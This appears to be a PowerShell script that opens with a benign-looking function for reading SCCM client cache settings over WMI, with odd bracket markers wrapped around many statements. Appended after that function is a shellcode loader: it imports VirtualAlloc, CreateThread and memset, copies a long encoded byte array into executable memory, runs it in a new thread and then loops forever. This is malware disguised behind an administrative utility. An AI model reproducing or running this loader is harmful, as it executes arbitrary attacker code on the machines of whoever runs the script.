 -||-> function Get-SCCMClientCacheInformation
{

    PARAM(
        [string[]]$ComputerName=".",

        [Alias('RunAs')]
        [System.Management.Automation.Credential()]
        [pscredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )

     -||-> FOREACH ($Computer in  -||-> $ComputerName <-||- )
    {
         -||-> Write-Verbose -message "[PROCESS] ComputerName: $Computer" <-||- 

        
         -||-> $SplattingWMI = @{
            NameSpace =  -||-> "ROOT\CCM\SoftMgmtAgent" <-||- 
            Class =  -||-> "CacheConfig" <-||- 
        } <-||- 

         -||-> IF ( -||-> $PSBoundParameters['ComputerName'] <-||- )
        {
             -||-> $SplattingWMI.ComputerName = $Computer <-||- 
        } <-||- 
         -||-> IF ( -||-> $PSBoundParameters['Credential'] <-||- )
        {
             -||-> $SplattingWMI.Credential = $Credential <-||- 
        } <-||- 

         -||-> TRY
        {
            
             -||-> Get-WmiObject @SplattingWMI <-||- 

        }
        CATCH
        {
             -||-> Write-Warning -message "[PROCESS] Something Wrong happened with $Computer" <-||- 
             -||-> $Error[0].execption.message <-||- 
        } <-||- 
    } <-||- 
} <-||- 

 -||-> $c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xba,0x58,0x4d,0xdb,0xc1,0xda,0xdb,0xd9,0x74,0x24,0xf4,0x5f,0x31,0xc9,0xb1,0x47,0x31,0x57,0x13,0x83,0xef,0xfc,0x03,0x57,0x57,0xaf,0x2e,0x3d,0x8f,0xad,0xd1,0xbe,0x4f,0xd2,0x58,0x5b,0x7e,0xd2,0x3f,0x2f,0xd0,0xe2,0x34,0x7d,0xdc,0x89,0x19,0x96,0x57,0xff,0xb5,0x99,0xd0,0x4a,0xe0,0x94,0xe1,0xe7,0xd0,0xb7,0x61,0xfa,0x04,0x18,0x58,0x35,0x59,0x59,0x9d,0x28,0x90,0x0b,0x76,0x26,0x07,0xbc,0xf3,0x72,0x94,0x37,0x4f,0x92,0x9c,0xa4,0x07,0x95,0x8d,0x7a,0x1c,0xcc,0x0d,0x7c,0xf1,0x64,0x04,0x66,0x16,0x40,0xde,0x1d,0xec,0x3e,0xe1,0xf7,0x3d,0xbe,0x4e,0x36,0xf2,0x4d,0x8e,0x7e,0x34,0xae,0xe5,0x76,0x47,0x53,0xfe,0x4c,0x3a,0x8f,0x8b,0x56,0x9c,0x44,0x2b,0xb3,0x1d,0x88,0xaa,0x30,0x11,0x65,0xb8,0x1f,0x35,0x78,0x6d,0x14,0x41,0xf1,0x90,0xfb,0xc0,0x41,0xb7,0xdf,0x89,0x12,0xd6,0x46,0x77,0xf4,0xe7,0x99,0xd8,0xa9,0x4d,0xd1,0xf4,0xbe,0xff,0xb8,0x90,0x73,0x32,0x43,0x60,0x1c,0x45,0x30,0x52,0x83,0xfd,0xde,0xde,0x4c,0xd8,0x19,0x21,0x67,0x9c,0xb6,0xdc,0x88,0xdd,0x9f,0x1a,0xdc,0x8d,0xb7,0x8b,0x5d,0x46,0x48,0x34,0x88,0xc9,0x18,0x9a,0x63,0xaa,0xc8,0x5a,0xd4,0x42,0x03,0x55,0x0b,0x72,0x2c,0xbc,0x24,0x19,0xd6,0x56,0x8b,0x76,0xd9,0xa5,0x63,0x85,0xda,0xb8,0x2f,0x00,0x3c,0xd0,0xdf,0x44,0x96,0x4c,0x79,0xcd,0x6c,0xed,0x86,0xdb,0x08,0x2d,0x0c,0xe8,0xed,0xe3,0xe5,0x85,0xfd,0x93,0x05,0xd0,0x5c,0x35,0x19,0xce,0xcb,0xb9,0x8f,0xf5,0x5d,0xee,0x27,0xf4,0xb8,0xd8,0xe7,0x07,0xef,0x53,0x21,0x92,0x50,0x0b,0x4e,0x72,0x51,0xcb,0x18,0x18,0x51,0xa3,0xfc,0x78,0x02,0xd6,0x02,0x55,0x36,0x4b,0x97,0x56,0x6f,0x38,0x30,0x3f,0x8d,0x67,0x76,0xe0,0x6e,0x42,0x86,0xdc,0xb8,0xaa,0xfc,0x0c,0x79 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $x=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $x.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$x,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



